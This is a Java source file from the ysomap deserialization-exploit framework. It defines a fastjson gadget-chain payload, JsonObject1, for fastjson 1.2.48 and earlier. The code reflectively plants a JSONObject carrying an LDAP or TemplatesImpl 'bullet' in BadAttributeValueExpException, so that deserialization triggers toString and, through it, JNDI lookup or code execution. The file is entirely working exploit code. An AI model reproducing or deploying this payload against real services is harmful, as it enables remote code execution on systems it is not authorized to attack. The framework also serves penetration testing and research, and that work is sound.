package ysomap.payloads.java.fastjson;

import com.alibaba.fastjson.JSONObject;
import ysomap.bullets.Bullet;
import ysomap.bullets.jdk.LdapAttributeBullet;
import ysomap.common.annotation.*;
import ysomap.core.util.PayloadHelper;
import ysomap.payloads.AbstractPayload;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;
import java.util.HashMap;

/**
 * @author wh1t3p1g
 * @since 2022/9/5
 */
@Payloads
@SuppressWarnings({"rawtypes"})
@Authors({ Authors.WH1T3P1G })
@Targets({Targets.JDK, Targets.JNDI})
@Require(bullets = {"LdapAttributeBullet", "TemplatesImplBullet"}, param = false)
@Dependencies({"fastjson<=1.2.48"})
public class JsonObject1 extends AbstractPayload<Object> {

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        return LdapAttributeBullet.newInstance(args);
    }

    @Override
    public Object pack(Object obj) throws Exception {
        JSONObject json = new JSONObject();
        json.put("ysomap", obj);
        BadAttributeValueExpException poc = new BadAttributeValueExpException(1);
        Field val = Class.forName("javax.management.BadAttributeValueExpException").getDeclaredField("val");
        val.setAccessible(true);
        val.set(poc,json);
        return PayloadHelper.makeReadObjectToStringTrigger(poc);
    }
}
